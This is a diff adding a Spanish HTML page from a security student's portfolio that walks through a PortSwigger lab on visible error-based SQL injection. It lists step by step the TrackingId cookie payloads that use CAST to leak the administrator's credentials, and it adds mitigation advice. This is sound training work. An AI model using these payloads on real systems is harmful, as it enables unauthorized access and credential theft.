@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 13 </title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Lab 13</h1>
+        <nav>
+            <ul>
+                <li><a href="pd03.html">← Volver al roadmap</a></li>
+                <li><a href="#lab">Laboratorio</a></li>
+                <li><a href="#procedimiento">Procedimiento</a></li>
+                <li><a href="#evidencia">Evidencia</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- LABORATORIO 13 -->
+    <section id="lab">
+        <h2>Lab13: Visible error-based SQL injection</h2>
+        
+        <table>
+            <tr>
+                <th>Nivel</th>
+                <td>Practitioner</td>
+            </tr>
+            <tr>
+                <th>Tipo de SQLi</th>
+                <td>Visible error based SQL injection</td>
+            </tr>
+        </table>
+
+        <h3>Objetivo</h3>
+        <p>Obtener la contraseña del usuario <strong>administrator</strong> de la tabla users utilizando una inyección basada en errores visibles.</p>
+
+        <h3>Vulnerabilidad</h3>
+        <p>Al introducir consultas SQL en la cookie <strong>TrackingId</strong>, se pueden obtener errores que ayudan a modificar la consulta para hacerla funcionar y poder obtener el usuario y la contraseña del administrador.</p>
+        
+        <p>La aplicación muestra mensajes de error detallados que revelan información sobre la estructura de la base de datos y cómo modificar la consulta para que sea sintácticamente correcta, permitiendo al atacante ajustar su payload basándose en la retroalimentación del error.</p>
+    </section>
+
+    <!-- PROCEDIMIENTO -->
+    <section id="procedimiento">
+        <h2>Procedimiento</h2>
+        
+        <ol>
+            <li>
+                <strong>Utilizar el interceptor de Burp Suite</strong> para capturar los paquetes enviados desde la página.
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px; margin-top: 10px;">GET / HTTP/1.1
+Cookie: TrackingId=xyz123</pre>
+            </li>
+            <li>
+                <strong>Observar que la página tiene una cookie llamada TrackingId</strong>. Al ser una cookie personalizada, se puede utilizar SQL Injection para obtener información.
+            </li>
+            <li>
+                <strong>Enviar la petición al Repeater</strong> y agregar una comilla después del valor de la cookie:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz'</pre>
+            </li>
+            <li>
+                <strong>Observar el error generado</strong>. La página muestra un error que revela la consulta SQL que se está ejecutando. El error indica que hay un carácter no esperado en la consulta.
+            </li>
+            <li>
+                <strong>Introducir comentarios (dashes)</strong> para que no lea lo que está después de la comilla:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz'--</pre>
+                <p>Con los dashes, el error desaparece, lo que confirma que la sintaxis ahora es correcta.</p>
+            </li>
+            <li>
+                <strong>Utilizar la función CAST</strong> para modificar el tipo de datos de la consulta a entero y generar errores controlados:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' AND CAST((SELECT 1) AS int)--</pre>
+                <p>Este payload genera un error que pide un carácter de tipo booleano.</p>
+            </li>
+            <li>
+                <strong>Modificar la consulta</strong> para incluir un 1 al inicio del CAST y hacerla booleana:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--</pre>
+                <p>Esta consulta es sintácticamente correcta y no genera error.</p>
+            </li>
+            <li>
+                <strong>Modificar la consulta SELECT</strong> para pedir datos de la tabla de usuarios:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--</pre>
+                <p>Aparece un error que dice "UNTERMINATED STRING starting AT", indicando que el string terminó después de cierto carácter y tiene un límite.</p>
+            </li>
+            <li>
+                <strong>Ajustar la consulta</strong> para quedar dentro del límite y usar LIMIT:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</pre>
+            </li>
+            <li>
+                <strong>Observar el error</strong> que muestra el primer usuario de la tabla, que normalmente es el usuario administrador. El error revela el nombre de usuario.
+            </li>
+            <li>
+                <strong>Modificar la consulta para pedir la contraseña</strong> en vez del usuario:
+                <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px; font-size: 1.1rem;">Cookie: TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</pre>
+                <p>El error generado muestra la contraseña del primer usuario (administrador).</p>
+            </li>
+            <li>
+                <strong>Introducir la contraseña obtenida</strong> en el formulario de login junto con el usuario "administrator" para resolver el laboratorio.
+            </li>
+        </ol>
+
+        <h3>Payloads utilizados</h3>
+        
+        <h4>Payload inicial (prueba de inyección)</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz'--</pre>
+        
+        <h4>Payload con CAST</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' AND 1=CAST((SELECT 1) AS int)--</pre>
+        
+        <h4>Payload para obtener nombre de usuario</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</pre>
+        
+        <h4>Payload para obtener contraseña</h4>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px; font-size: 1.1rem;">xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</pre>
+        
+        <h4>Explicación de los payloads</h4>
+        <ul>
+            <li><strong>xyz'</strong>: Cierra la cadena original de la cookie TrackingId.</li>
+            <li><strong>AND</strong>: Permite agregar una condición adicional a la consulta.</li>
+            <li><strong>1=CAST((SELECT ...) AS int)</strong>: Fuerza la conversión a entero del resultado de la subconsulta. Si el resultado no es un número entero válido, la base de datos genera un error que muestra el valor en el mensaje de error.</li>
+            <li><strong>(SELECT username FROM users LIMIT 1)</strong>: Obtiene el primer nombre de usuario de la tabla users.</li>
+            <li><strong>(SELECT password FROM users LIMIT 1)</strong>: Obtiene la primera contraseña de la tabla users.</li>
+            <li><strong>LIMIT 1</strong>: Limita el resultado a una sola fila para evitar errores de subconsulta que devuelve múltiples filas.</li>
+            <li><strong>--</strong>: Comenta el resto de la consulta original.</li>
+        </ul>
+
+        <h4>Proceso de extracción mediante errores</h4>
+        <ul>
+            <li><strong>Paso 1:</strong> Probar comilla simple para generar error y confirmar inyección.</li>
+            <li><strong>Paso 2:</strong> Usar comentarios para eliminar el error y validar la sintaxis.</li>
+            <li><strong>Paso 3:</strong> Usar CAST para generar errores controlados que revelen información.</li>
+            <li><strong>Paso 4:</strong> Ajustar la consulta según los mensajes de error hasta obtener los datos deseados.</li>
+            <li><strong>Paso 5:</strong> El error muestra directamente el valor de la contraseña en el mensaje.</li>
+        </ul>
+        
+        <p>Ejemplo de mensaje de error con la contraseña:</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">
+ERROR: invalid input syntax for type integer: "8fg5h2j1k4m9p3q7r2s5"
+        </pre>
+    </section>
+
+    <!-- EVIDENCIA TÉCNICA -->
+    <section id="evidencia">
+        
+        <h3>Verificación del ataque</h3>
+        <p>La vulnerabilidad se confirma cuando al enviar el payload con CAST, la página muestra un error que contiene el valor de la contraseña del administrador. Esto demuestra que:</p>
+        <ul>
+            <li>La aplicación revela información sensible en mensajes de error.</li>
+            <li>Es posible extraer datos completos mediante errores visibles.</li>
+            <li>La técnica es más rápida que la inyección ciega booleana.</li>
+        </ul>
+        
+        <p>Una vez obtenida la contraseña (por ejemplo, "8fg5h2j1k4m9p3q7r2s5"), se introduce en el formulario de login junto con el usuario "administrator" y se accede al panel de administración, demostrando el éxito del ataque.</p>
+        
+        <div style="background-color: #1e293b; padding: 15px; border-radius: 8px; margin-top: 20px;">
+            <p><strong>Resultado esperado:</strong> El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.</p>
+        </div>
+    </section>
+
+    <!-- MITIGACIÓN RECOMENDADA -->
+    <section>
+        <h2>Mitigación recomendada</h2>
+        
+        <h4>Gestión Segura de Errores</h4>
+        <p>La principal mitigación es configurar la aplicación para que no muestre errores detallados de base de datos al usuario. Los mensajes de error deben ser genéricos (ej. "Error interno del servidor") mientras que los detalles se registran en logs internos accesibles solo por administradores.</p>
+        
+        <h4>Consultas Preparadas (Parameterized Queries)</h4>
+        <p>Implementar consultas parametrizadas para evitar que los datos del usuario se interpreten como código SQL.</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">SELECT * FROM tracking WHERE id = ?</pre>
+        
+        <h4>Validación de Entradas</h4>
+        <p>Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible, rechazar cualquier valor que no cumpla con ese patrón.</p>
+        
+        <h4>Principio de Menor Privilegio</h4>
+        <p>La cuenta de base de datos debe tener permisos mínimos, limitando el acceso a las tablas necesarias.</p>
+        
+        <h4>Deshabilitar Mensajes de Error Detallados en Producción</h4>
+        <p>En entornos de producción, deshabilitar la visualización de errores detallados y mostrar páginas de error personalizadas.</p>
+        
+        <h4>Web Application Firewall (WAF)</h4>
+        <p>Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de manipulación de cookies.</p>
+    </section>
+
+    <!-- REFERENCIA AL DOCUMENTO ORIGINAL -->
+    <section style="background-color: #0f172a; border: 1px solid #334155;">
+         <p><a href="act08-Equipo1.pdf" class="btn-blog" style="margin-top: 10px; display: inline-block;" download>Descargar PDF completo</a></p>
+    </section>
+
+    <!-- NAVEGACIÓN ENTRE LABORATORIOS -->
+    <section style="display: flex; justify-content: space-between; margin-top: 30px;">
+        <a href="pd03-lab12.html" class="btn-blog">← Laboratorio anterior (Lab 12)</a>
+        <a href="pd03-lab14.html" class="btn-blog">Siguiente laboratorio (Lab 14) →</a>
+    </section>
+
+    <footer>
+        <p>  Slugish – Portafolio de Seguridad Informática</p>
+        <p>GitHub: <a href="https://github.com/sluggishpoem" target="_blank">github.com/sluggishpoem</a></p>
+    </footer>
+</body>
+</html>
